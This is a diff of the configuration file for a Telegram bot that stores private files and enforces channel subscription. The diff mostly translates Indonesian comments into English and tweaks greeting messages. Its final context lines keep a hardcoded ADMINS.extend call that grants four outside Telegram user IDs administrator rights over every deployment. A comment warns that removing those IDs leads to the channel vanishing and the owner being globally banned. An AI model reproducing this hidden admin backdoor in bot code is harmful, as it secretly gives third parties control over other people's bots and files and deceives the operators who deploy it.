@@ -10,13 +10,13 @@ from logging.handlers import RotatingFileHandler
 
 load_dotenv("config.env")
 
-# Bot token dari @Botfather
+# Bot token from @Botfather
 TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
 
-# API ID Anda dari my.telegram.org
+# API ID from my.telegram.org
 APP_ID = int(os.environ.get("APP_ID", ""))
 
-# API Hash Anda dari my.telegram.org
+# API Hash from my.telegram.org
 API_HASH = os.environ.get("API_HASH", "")
 
 # ID Channel Database
@@ -38,27 +38,27 @@ UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")
 # Database
 DB_URI = os.environ.get("DATABASE_URL", "")
 
-# ID dari Channel Atau Group Untuk Wajib Subscribenya
+# ID from a channel or group for mandatory subscription
 FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
 FORCE_SUB_CHANNEL_2 = int(os.environ.get("FORCE_SUB_CHANNEL_2", "0"))
 FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "0"))
 
 TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))
 
-# Pesan Awalan /start
+# Prefix Message /start
 START_MSG = os.environ.get(
     "START_MESSAGE",
-    "<b>Hello {first}</b>\n\n<b>I can save private files on Certain Channels and other users can access them from special links.</b>",
+    "<b>Hello Guys {first}</b>\n\n<b>I can save private files on Certain Channels and other users can access them from special links.</b>",
 )
 try:
     ADMINS = [int(x) for x in (os.environ.get("ADMINS", "").split())]
 except ValueError:
     raise Exception("Your Admin list does not contain a valid Telegram User ID.")
 
-# Pesan Saat Memaksa Subscribe
+# Message When Forcing a Subscribe
 FORCE_MSG = os.environ.get(
     "FORCE_SUB_MESSAGE",
-    "<b>Hello {first}\n\nYou must join the Channel/Group me First to See My Shared Files\n\nPlease Join The Channel & Group First</b>",
+    "<b>Hello Bro {first}\n\nYou must join the Channel/Group me First to See My Shared Files\n\nPlease Join The Channel & Group First</b>",
 )
 
 # Set your Custom Text here, Save (None) to Disable Custom Text
@@ -67,7 +67,7 @@ CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 # Set True if you want to Disable your Channel Post Share button
 DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))
 
-# Don't delete later ERROR, DELETE ID Below = TERIMA KONSEKUENSI
+# Don't delete later ERROR, DELETE ID Below = ACCEPT CONSEQUENCES
 # Spoiler CONSEQUENCES Most of the time the CH is suddenly gone & the owner is gban 🤪
 ADMINS.extend((844432220, 1250450587, 1750080384, 182990552))
 
